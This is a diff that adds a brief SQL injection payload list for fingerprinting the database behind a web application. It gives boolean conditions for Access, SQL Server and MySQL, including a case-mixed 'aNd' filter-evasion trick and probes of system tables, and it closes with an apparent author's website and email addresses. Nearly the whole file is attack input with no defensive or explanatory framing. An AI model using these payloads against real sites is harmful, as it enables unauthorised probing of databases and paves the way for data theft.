@@ -1,0 +1,18 @@
+Access:
+ aNd aSc(cHr(97))=97
+ and exists(select id from MSysAccessObjects)
+
+
+SQL Server:
+ and exists(select id from sysobjects)
+ and len(user)>0
+
+MySQL:
+ and length(user())>0
+
+
+
+	www.liqidis.com
+	liqidis@hotmail.com
+	liqidis@gmail.com
+
